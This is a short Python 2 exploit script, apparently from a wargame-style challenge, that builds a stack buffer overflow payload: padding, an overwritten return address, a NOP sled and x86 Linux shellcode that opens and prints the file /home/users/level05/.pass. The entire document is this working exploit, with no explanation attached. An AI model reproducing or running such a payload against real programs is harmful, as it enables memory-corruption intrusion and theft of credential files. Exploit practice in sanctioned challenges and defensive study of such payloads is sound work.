import struct

offset = b"A"*128 + b"BBBB"*7
address = struct.pack("I", 0xffffd710+0x50)
trap = b"\xCC"
nop = b"\x90"

shell_code = 0x100*nop+b'jsh.pashl05/hlevehers/he/ush/hom\x89\xe31\xc9j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'



payload = offset + address + shell_code

print payload
